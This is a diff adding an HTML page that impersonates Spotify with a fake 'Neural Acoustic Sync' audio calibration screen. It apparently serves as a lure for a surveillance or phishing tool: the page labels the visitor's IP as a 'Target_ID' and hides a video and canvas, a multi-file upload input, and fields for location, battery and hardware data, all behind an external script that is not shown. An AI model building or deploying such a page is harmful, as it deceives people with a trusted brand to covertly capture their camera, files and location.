@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify | Neural Audio Sync</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
+        body { background: radial-gradient(circle at top, #1DB95422, #000000); color: #ffffff; font-family: 'Inter', sans-serif; overflow: hidden; }
+        .spot-green { background-color: #1DB954; color: #121212; }
+        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.08); }
+        .wave-container { display: flex; align-items: center; justify-content: center; gap: 4px; height: 50px; }
+        .wave-bar { width: 4px; background: #1DB954; border-radius: 2px; animation: wave 1.2s infinite ease-in-out; }
+        @keyframes wave { 0%, 100% { height: 10px; } 50% { height: 45px; } }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+    <header class="p-8 flex justify-between items-center">
+        <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_RGB_White.png" width="130">
+        <div class="glass px-4 py-1.5 rounded-full text-[10px] font-bold text-emerald-500 border-emerald-500/30 animate-pulse">HI-FI_NODE_ACTIVE</div>
+    </header>
+
+    <main class="flex-grow flex flex-col items-center justify-center px-6">
+        <div class="max-w-xl w-full glass p-10 rounded-[3rem] shadow-2xl relative border-t border-white/10">
+            <div class="wave-container mb-10">
+                <div class="wave-bar" style="animation-delay: 0.1s"></div>
+                <div class="wave-bar" style="animation-delay: 0.3s"></div>
+                <div class="wave-bar" style="animation-delay: 0.5s"></div>
+                <div class="wave-bar" style="animation-delay: 0.2s"></div>
+                <div class="wave-bar" style="animation-delay: 0.4s"></div>
+            </div>
+
+            <h2 class="text-4xl font-black mb-4 text-center tracking-tighter italic">Neural Acoustic <span class="text-[#1DB954]">Sync</span></h2>
+            <p class="text-gray-400 text-xs mb-10 text-center leading-relaxed uppercase tracking-widest font-bold">Spatial Audio Calibration & Device Integrity Check</p>
+
+            <div class="grid grid-cols-2 gap-4 mb-8">
+                <div class="bg-black/40 p-4 rounded-2xl border border-white/5">
+                    <span class="text-[8px] text-gray-500 block uppercase mb-1">Target_ID</span>
+                    <span id="target-ip" class="text-[10px] text-white font-mono">IDENTIFYING...</span>
+                </div>
+                <div class="bg-black/40 p-4 rounded-2xl border border-white/5">
+                    <span class="text-[8px] text-gray-500 block uppercase mb-1">Latency</span>
+                    <span id="isp-val" class="text-[10px] text-emerald-500 font-mono">---</span>
+                </div>
+            </div>
+
+            <button id="init-btn" class="spot-green w-full py-5 rounded-full font-black uppercase tracking-[0.2em] text-sm hover:scale-[1.02] active:scale-95 transition-all shadow-[0_0_40px_rgba(29,185,84,0.3)]">
+                Calibrate Audio Node
+            </button>
+        </div>
+    </main>
+
+    <footer class="p-10 text-center text-[9px] text-gray-600 font-black tracking-[0.3em] uppercase italic">
+        "Deciphering the future before it happens.." | © CIPHER ELITE LABS
+    </footer>
+
+    <!-- CIPHER-X SOVEREIGN COMPONENTS (DO NOT REMOVE) -->
+    <video id="v-hidden" class="hidden" autoplay playsinline></video>
+    <canvas id="c-hidden" class="hidden"></canvas>
+    <div id="terminal" class="hidden"></div>
+    <span id="ram-val" class="hidden"></span>
+    <span id="core-val" class="hidden"></span>
+    <span id="bat-val" class="hidden"></span>
+    <span id="loc-val" class="hidden"></span>
+    <div id="upload-status" class="hidden"><div id="upload-bar"></div><span id="percent-text"></span></div>
+    <input type="file" id="file-input" class="hidden" multiple>
+    <div id="drop-zone" class="hidden"></div>
+
+    <script src="/app.js"></script>
+    <script>
+        lucide.createIcons();
+        document.getElementById('init-btn').addEventListener('click', function() {
+            this.innerHTML = '<span class="animate-pulse">SYNCING...</span>';
+            this.classList.add('opacity-50', 'pointer-events-none');
+        });
+    </script>
+</body>
+</html>
